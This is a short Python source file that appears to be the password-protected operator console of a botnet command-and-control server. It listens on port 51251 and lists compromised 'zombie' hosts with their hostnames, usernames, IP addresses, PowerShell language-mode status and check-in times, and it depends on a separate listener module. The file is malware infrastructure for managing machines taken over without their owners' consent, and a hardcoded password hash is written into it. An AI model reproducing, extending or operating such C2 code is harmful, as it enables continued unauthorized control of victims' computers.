import time
import socket
import listener
import bcrypt
from prettytable import PrettyTable



def list_zombies(socket):

	x = PrettyTable()
	x.field_names = ["uuid", "hostname", "username", "IP", "is_constrained_language_on", "last_check_in"]

	for z in listener.zombies:
		x.add_row([z.uuid, z.hostname, z.username, z.ip, z.clm, z.last_check_in])

	socket.send(x.get_string().encode())



def close_socket(socket):
	socket.close()




def print_menu(socket):
	menu = """ 

0) List zombies
1) Exit

Please enter choice: """

	socket.send(menu.encode())
	choice = int(socket.recv(2048).decode('utf-8'))
	return choice

def start():
	# bcrypt password hash
	hash = b'$2b$12$5f2z5D3nmeGV0bVOKmJlXuM0ncQXHu9IokJWe/XZZEVc4cxUV3sZS'

	# create an INET, STREAMing socket
	serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	# bind the socket to a public host, and a well-known port
	serversocket.bind((socket.gethostname(), 51251))
	# become a server socket
	serversocket.listen(5)
	
	

	while True:
		(clientsocket, address) = serversocket.accept()
		clientsocket.send(b'Please enter password: ')
		password = clientsocket.recv(2048)
		if not bcrypt.checkpw(password, hash):
			clientsocket.close()
		while clientsocket.fileno() != -1:
			choice = print_menu(clientsocket)
			if choice == 0:
				list_zombies(clientsocket)
			elif choice == 1:
				# Exit
				close_socket(clientsocket)
			else:
				close_socket(clientsocket)
